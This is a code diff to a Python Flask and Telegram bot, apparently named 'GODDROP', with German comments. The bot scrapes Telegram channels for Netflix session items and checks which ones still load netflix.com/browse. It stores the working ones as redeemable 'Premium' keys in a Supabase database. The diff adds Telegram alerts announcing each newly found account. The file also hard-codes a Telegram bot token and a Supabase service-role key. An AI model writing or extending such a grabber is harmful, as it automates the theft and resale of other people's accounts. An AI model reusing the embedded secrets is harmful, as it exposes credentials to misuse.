@@ -14,6 +14,7 @@ app = Flask(__name__)
 
 # DEIN GODDROP BOT TOKEN
 BOT_TOKEN = '8980059554:AAGi4797fL5HA4HIfFO74HFhEEmt6A2OoUQ'
+CHAT_ID = '6584278242'
 
 # LÖSCHT ALLE ALTEN VERBINDUNGEN
 try:
@@ -23,7 +24,7 @@ except: pass
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# SUPABASE DATEN (Service Role Key)
+# SUPABASE DATEN
 SUPABASE_URL = "https://drrbibjafmqcxqhxswfy.supabase.co" 
 SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRycmJpYmphZm1xY3hxaHhzd2Z5Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc5MzQ2NjQ2NiwiZXhwIjoyMTA5MDQyNDY2fQ.XElFDbLqZT_bbRP9EomuZlH7gbflUni46fvGvm9hleo"
 
@@ -55,6 +56,11 @@ def test_item(item):
             return requests.get('https://www.netflix.com/browse', headers=headers, allow_redirects=False, timeout=5).status_code == 200
     except Exception:
         return False
+
+def send_alert(msg):
+    try:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
+    except: pass
 
 def scan_telegram(channel):
     found = []
@@ -115,6 +121,9 @@ def grabber_loop():
                     newKey = 'CLM-' + os.urandom(4).hex().upper()
                     meta = {"email": "Token/Login", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
                     requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": platform})
+                    
+                    # HIER WIRD DIE BENACHRICHTIGUNG GESCHICKT
+                    send_alert(f"🚨 **NEUER ACCOUNT GEFUNDEN!**\n\nPlattform: {platform.capitalize()}\nKey: `{newKey}`\n\nLöse ihn auf der Webseite ein!")
                     
         time.sleep(60)
 
